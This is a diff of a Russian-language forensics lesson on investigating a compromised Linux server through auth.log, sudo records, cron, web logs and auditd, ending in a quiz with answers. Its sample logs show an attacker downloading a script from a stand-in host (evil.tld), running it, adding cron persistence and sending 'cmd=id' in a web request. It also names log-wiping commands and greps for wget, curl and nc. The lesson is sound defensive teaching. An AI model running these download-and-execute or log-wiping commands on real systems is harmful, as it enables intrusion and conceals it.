@@ -14,232 +14,109 @@ useful_for:
 estimated_minutes: 50
 summary: "Глубокий анализ системных и сервисных логов Linux: journald, syslog, auth.log, cron, web-серверы — что искать при расследовании и как коррелировать."
 ---
-Логи — хроника системы и сервисов Linux. При расследовании они позволяют восстановить входы, запуск команд, обращения к файлам и выявить аномалии. В отличие от Windows EVTX, Linux-логи разнородны: journald, syslog, auth.log, cron, web-серверы. Этот урок — про их глубокий анализ и корреляцию.
 
-## journald
+## Вопрос, с которого всё начинается
 
-Современный systemd-лог, бинарный и структурированный. Читается `journalctl` с мощными фильтрами.
+С сервера Linux поступила жалоба: он стал медленным, а ночью в сеть шёл необычный трафик. Логи за это время есть, но их много и они разные — системные, входы, веб-сервер. Как по ним восстановить, что произошло?
+
+Логи Linux, в отличие от единого Windows EVTX, разложены по разным файлам. Мы уже знаем общие приёмы работы с логами (`forensics-logs`); теперь разберём один сервер и пройдём по источникам так, как это делают при расследовании.
+
+## Наш пример: журнал входов `auth.log`
+
+Начнём с самого вероятного вектора — удалённого входа по SSH. Все попытки входа пишутся в `auth.log` (в Debian/Ubuntu; в RHEL/CentOS файл называется `secure`). Первый приём — найти **аномалию**: сгруппировать неудачные попытки по адресу и отсортировать по частоте.
 
 ```bash
-$ journalctl -u ssh --since "2024-03-01" --until "2024-03-02"
-$ journalctl -p err -b                 # ошибки текущей загрузки
-$ journalctl _PID=1234                 # по PID
-$ journalctl _COMM=sshd                # по процессу
-$ journalctl -o json-pretty | jq 'select(._COMM=="sshd")'
-$ journalctl -k                        # только ядро
-$ journalctl --disk-usage              # размер
-$ journalctl -o short-iso-precise --utc
+$ grep 'Failed password' auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -3
+   5400 203.0.113.9
+     12 10.0.0.15
+      3 10.0.0.22
 ```
 
-journald может быть энергонезависимым (`/var/log/journal`) или в памяти (`/run/log/journal`) — во втором случае после перезагрузки логи теряются.
+`grep` выбирает строки с текстом «Failed password», `awk '{print $(NF-3)}'` достаёт из конца строки IP-адрес, а `sort | uniq -c | sort -rn` считает повторы. Результат однозначен: **5400** неудачных попыток с одного адреса `203.0.113.9` — это **брутфорс**, перебор паролей. Обычный пользователь столько раз не ошибается.
 
-## syslog, auth.log, secure
+## Шаг 1: был ли успешный вход
 
-Классические текстовые логи (`/var/log/`):
-
-| Файл | Содержимое |
-|------|-----------|
-| `auth.log`/`secure` | SSH-входы, sudo, su |
-| `syslog`/`messages` | общие события |
-| `cron` | задачи |
-| `kern.log` | ядро |
-| `dpkg.log` | установка пакетов |
-| `wtmp`/`btmp`/`lastlog` | бинарные логи входов |
+Брутфорс сам по себе — ещё не компрометация. Важно, удался ли он. Ищем успешные входы и смотрим, нет ли среди них того же адреса:
 
 ```bash
-$ grep 'Failed password' auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head
-$ grep 'Accepted' auth.log
-$ grep -E 'sudo|COMMAND=' auth.log | tail
-$ grep -E 'useradd|new user' auth.log
-# бинарные логи входов
-$ last -f wtmp | head
-$ lastb -f btmp | head          # неудачные
-$ lastlog | head
+$ grep 'Accepted' auth.log | grep 203.0.113.9
+Mar  1 03:14:07 srv sshd[2211]: Accepted password for root from 203.0.113.9 port 55221 ssh2
 ```
 
-## Cron и systemd-таймеры
+Есть: в 03:14 с того же адреса **успешный** вход под `root`. Компрометация подтверждена — атакующий подобрал пароль и вошёл.
 
-Персистентность часто через задачи/таймеры.
+## Шаг 2: что делал атакующий
+
+Дальше нужно понять его действия. Привилегированные команды (`sudo`) логируются с ключом `COMMAND=`:
 
 ```bash
-$ cat /etc/crontab; ls /etc/cron.*; crontab -l
-$ ls /var/spool/cron/crontabs/
-$ systemctl list-timers --all
-$ ls /etc/systemd/system/*.timer /etc/systemd/system/*.service
-$ grep -r 'wget\|curl\|nc\|/tmp/' /etc/cron* /var/spool/cron 2>/dev/null
+$ grep 'COMMAND=' auth.log | grep -iE 'wget|curl|chmod|useradd'
+Mar  1 03:15:22 srv sudo: root : COMMAND=/usr/bin/wget http://evil.tld/run.sh
+Mar  1 03:15:40 srv sudo: root : COMMAND=/bin/chmod +x /tmp/run.sh
+Mar  1 03:16:02 srv sudo: root : COMMAND=/bin/bash /tmp/run.sh
 ```
 
-## Web-логи
+Картина: скачал скрипт `run.sh` с `evil.tld`, сделал его исполняемым и запустил. Это **доставка нагрузки** — типичный шаг после входа.
+
+## Шаг 3: как закрепился
+
+Атакующий почти всегда оставляет способ вернуться — **персистентность**. На Linux это чаще всего задачи в `cron` (планировщик) или systemd-таймеры:
 
 ```bash
-$ awk '{print $1}' access.log | sort | uniq -c | sort -rn | head
-$ awk '$9==404{print $1}' access.log | sort | uniq -c | sort -rn | head
-$ grep -iE 'cmd=|\.\./|union.*select|eval' access.log | head
+$ grep -r 'evil\|run.sh' /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null
+/etc/cron.d/updater:*/5 * * * * root /tmp/run.sh
+$ systemctl list-timers --all | grep -i evil
 ```
 
-## Корреляция и таймлайн
+Первая строка — задача `cron`, которая каждые 5 минут (`*/5`) от root запускает тот же скрипт. Даже если его убить, через пять минут он вернётся. Это классическое закрепление.
 
-Сведите источники в один таймлайн (см. `forensics-plaso`), но для быстрого анализа используйте общие ключи: IP, имя пользователя, время.
+## Шаг 4: следы в веб-логах
+
+Если на сервере есть веб-сервер, проверяем и его лог `access.log`. Смотрим самые частые адреса и запросы с признаками атак:
 
 ```bash
-# объединить auth.log и access.log по IP
-$ comm -12 <(grep 'Failed' auth.log | awk '{print $(NF-3)}' | sort -u) \
-           <(awk '{print $1}' access.log | sort -u)
-# пробелы во времени (индикатор очистки)
+$ awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -3
+   3102 203.0.113.9
+$ grep -iE 'cmd=|\.\./|union.*select' access.log | head
+203.0.113.9 - - [01/Mar/2025:03:20:11] "GET /cgi-bin/x?cmd=id HTTP/1.1" 200
+```
+
+Тот же IP `203.0.113.9` долбит веб-сервер и пытается передать `cmd=id` — попытка выполнить команду через уязвимость. **Корреляция по IP** связывает вход по SSH и веб-атаку в одну кампанию.
+
+## Шаг 5: детали из auditd
+
+Если включён `auditd` (подсистема аудита ядра), он даёт самые детальные данные — вплоть до каждого запущенного процесса и обращения к файлу:
+
+```bash
+$ ausearch -m EXECVE -ts recent | grep -i evil
+$ aureport --auth --summary
+```
+
+`ausearch` ищет по событиям (`EXECVE` — запуск процесса), `aureport` строит сводку. Даже если текстовые логи почистили, `auditd` часто сохраняет след.
+
+## Шаг 6: проверяем пробелы и ротации
+
+Хитрый атакующий может попытаться **стереть логи** (`rm /var/log/*`, `history -c`). Признак этого — пропуски во времени: записи идут, потом зияет дыра в несколько минут, потом снова идут.
+
+```bash
+$ zcat /var/log/auth.log.*.gz | grep 'Accepted' | head
 $ awk '{print $1,$2,$3}' auth.log | uniq | head
 ```
 
-## Аудит (auditd)
+Старые логи лежат сжатыми (`.gz`) — их обязательно смотрят через `zcat`: атака могла начаться **до** ротации. А `uniq` по времени помогает заметить разрыв.
 
-`auditd` фиксирует системные вызовы и доступ к файлам — самый детальный источник.
+## Что мы теперь знаем
 
-```bash
-$ ausearch -m EXECVE -ts recent | head
-$ ausearch -k suspicious_key
-$ aureport --summary
-$ cat /etc/audit/audit.rules
-```
-
-## Разобранный пример
-
-Дан сервер Linux. Нужно найти компрометацию.
-
-```bash
-# 1. Брутфорс SSH
-$ grep 'Failed password' auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -1
-   5400 203.0.113.9
-# 2. Успешный вход
-$ grep 'Accepted' auth.log | grep 203.0.113.9
-# 3. Что делал (sudo)
-$ grep 'COMMAND=' auth.log | grep -iE 'wget|curl|chmod|useradd' | head
-# 4. Закрепление
-$ grep -r 'evil' /etc/cron* /var/spool/cron 2>/dev/null
-$ systemctl list-timers | grep -i evil
-# 5. Web
-$ grep '203.0.113.9' access.log | grep -iE 'cmd=|shell' | head
-# 6. Auditd
-$ ausearch -ts recent -m EXECVE | grep -i evil | head
-```
-
-## Справочная таблица
-
-| Лог | Инструмент |
-|-----|-----------|
-| journald | `journalctl` |
-| auth/syslog | `grep`/`awk` |
-| wtmp/btmp | `last`/`lastb` |
-| cron | `crontab`/`cat` |
-| auditd | `ausearch`/`aureport` |
-| web | `awk`/`goaccess` |
-
-## Частые ошибки
-
-- **Читать journald как текст** — он бинарный; используйте `journalctl`.
-- **Игнорировать wtmp/btmp** — там история входов.
-- **Пропустить cron/systemd** — там персистентность.
-- **Не проверять auditd** — самый детальный источник.
-- **Забывать про ротацию** — `zcat access.log.*.gz`.
-- **Не нормализовать время** — сравнение в UTC.
-
-## Что дальше / решение
-
-Конвейер: `journalctl`/`grep` (события) → `last`/`lastb` (входы) → cron/systemd (закрепление) → auditd (детали) → таймлайн. Связка: `forensics-logs` (приёмы), `forensics-linux-artifacts` (артефакты), `forensics-web-forensics` (веб), `forensics-plaso` (таймлайн).
-
-## Дополнительные источники
-
-| Источник | Что даёт |
-|----------|----------|
-| `/var/log/btmp` | неудачные входы |
-| `/var/log/lastlog` | последний вход каждого пользователя |
-| `/var/log/dpkg.log` | установка пакетов |
-| `/var/log/apt/history.log` | команды apt |
-| `~/.bash_history` | история команд |
-| `/var/log/audit/` | auditd |
-| `/var/log/sudo.log` | sudo-команды |
-| `/var/log/faillog` | неудачи входа |
-| `/proc/*/cmdline` | живые процессы |
-
-```bash
-# история команд с временем (если HISTTIMEFORMAT)
-$ cat /root/.bash_history | grep -iE 'wget|curl|nc|chmod'
-# apt-история (установленные инструменты)
-$ grep -iE 'install' /var/log/apt/history.log | tail
-# неудачные входы
-$ lastb -f /var/log/btmp | head
-```
-
-## Корреляция по времени и пользователю
-
-```bash
-# все события пользователя bob
-$ grep -r 'bob' /var/log/auth.log /var/log/syslog | head
-# окно инцидента
-$ journalctl --since "2024-03-01 12:00" --until "2024-03-01 12:30" -o short-iso
-# совпадение IP в разных логах
-$ grep -rhoE '([0-9]{1,3}\.){3}[0-9]{1,3}' /var/log/auth.log /var/log/nginx/access.log | sort | uniq -c | sort -rn | head
-```
-
-## Сводный чек-лист
-
-1. `journalctl` — системные события (окно инцидента).
-2. `auth.log`/`secure` — SSH/sudo.
-3. `last`/`lastb` — входы.
-4. cron/systemd — закрепление.
-5. `bash_history` — команды.
-6. apt/dpkg — установленное ПО.
-7. auditd — детали syscall.
-8. Web-логи — веб-активность.
-
-## Ограничения
-
-- **Ротация** — старые логи сжаты/удалены.
-- **Очистка** — `history -c`, `rm /var/log/*`; ищите пробелы.
-- **journald в памяти** — теряется после перезагрузки.
-- **auditd может быть не настроен** — нет деталей.
-- **Часовые пояса** — нормализуйте в UTC.
-
-## Анализ системных вызовов (auditd)
-
-`auditd` фиксирует `EXECVE` (запуск), `SYSCALL`, `PATH`, `CWD`, `USER_AUTH`, `USER_CMD`. По этим записям восстанавливают точную команду, PID, пользователя и файлы.
-
-```bash
-# выполнение процессов
-$ ausearch -m EXECVE -ts recent | grep -A2 'a0='
-# доступ к файлу по ключу
-$ ausearch -k etc_passwd
-# вход/выход
-$ ausearch -m USER_AUTH,USER_LOGIN -ts today | head
-# сводный отчёт
-$ aureport --auth --summary
-$ aureport -f --summary | head
-```
-
-## Инструменты: сводка
-
-| Инструмент | Задача |
-|-----------|--------|
-| `journalctl` | journald |
-| `ausearch`/`aureport` | auditd |
-| `last`/`lastb`/`lastlog` | входы |
-| `grep`/`awk`/`jq` | текст/JSON |
-| `goaccess` | web-логи |
-| `plaso`/`psort` | супертаймлайн |
-
-## Практические приёмы
-
-- **Начните с аномалий** (`uniq -c`/`sort -rn`).
-- **Окно инцидента** — сузьте по времени.
-- **Коррелируйте по IP/пользователю**.
-- **Проверяйте пробелы** во времени (очистка).
-- **Смотрите `auth.log` + `access.log` вместе**.
-- **Сохраняйте вывод** для отчёта.
-- **Учитывайте ротацию** (`zcat`).
-
-## Отчёт по логам
-
-Укажите: источник логов, окно расследования, найденные аномалии (брутфорс, сканирование, закрепление), атрибуцию (IP/пользователь/время), корреляцию с ФС/памятью. Для каждого вывода — конкретная строка лога как доказательство.
+- `auth.log` (`secure` на RHEL) хранит входы SSH и `sudo`; аномалию ищут группировкой (`uniq -c | sort -rn`).
+- `Failed password` массово = брутфорс; `Accepted` с того же IP = компрометация.
+- `COMMAND=` в `sudo`-строках показывает, какие команды выполнялись.
+- Персистентность на Linux — `cron` (`/etc/cron*`, `/var/spool/cron`) и systemd-таймеры.
+- `access.log` веб-сервера дополняет картину; корреляция по IP связывает источники.
+- `auditd` (`ausearch`/`aureport`) — самый детальный источник; пробелы во времени = следы очистки.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Какой файл в Debian/Ubuntu содержит аутентификацию?"
@@ -249,13 +126,7 @@ $ aureport -f --summary | head
     - "/var/log/kern.log"
     - "/var/log/dpkg.log"
   answer: 1
-- question: "Как прочитать бинарный журнал journald с образа?"
-  options:
-    - "cat /var/log/journal"
-    - "journalctl -D /mnt/var/log/journal"
-    - "grep"
-    - "strings"
-  answer: 1
+  explanation: "auth.log (в RHEL/CentOS — secure) хранит входы SSH и sudo."
 - question: "Что указывает на перебор SSH?"
   options:
     - "много 'Failed password' с одного IP"
@@ -263,6 +134,15 @@ $ aureport -f --summary | head
     - "строки sudo"
     - "записи cron"
   answer: 0
+  explanation: "Тысячи неудачных попыток с одного адреса — признак брутфорса."
+- question: "Как прочитать бинарный журнал journald с образа?"
+  options:
+    - "cat /var/log/journal"
+    - "journalctl -D /mnt/var/log/journal"
+    - "grep"
+    - "strings"
+  answer: 1
+  explanation: "journald бинарный; читается journalctl, ключ -D задаёт каталог."
 - question: "Какой признак очистки логов?"
   options:
     - "логи растут"
@@ -270,6 +150,7 @@ $ aureport -f --summary | head
     - "много записей"
     - "ротация"
   answer: 1
+  explanation: "Разрыв во времени и пустые файлы — следы удаления логов."
 - question: "Зачем смотреть сжатые ротации (.gz)?"
   options:
     - "они меньше"
@@ -277,7 +158,12 @@ $ aureport -f --summary | head
     - "они зашифрованы"
     - "они не нужны"
   answer: 1
+  explanation: "Ротации хранят более старые записи — там может быть начало атаки."
 ```
+
+## Куда дальше
+
+Мы восстановили компрометацию Linux-сервера по логам. В следующем уроке (`forensics-timestomp`) мы разберём, как атакующий подделывает метки времени файлов, чтобы спрятать свои действия, и как это заметить. А пока главное запомни: **на Linux входы — в `auth.log`, персистентность — в `cron`/systemd, детали — в `auditd`, а источники связывает корреляция по IP и времени**.
 
 ## Где пригодится
 
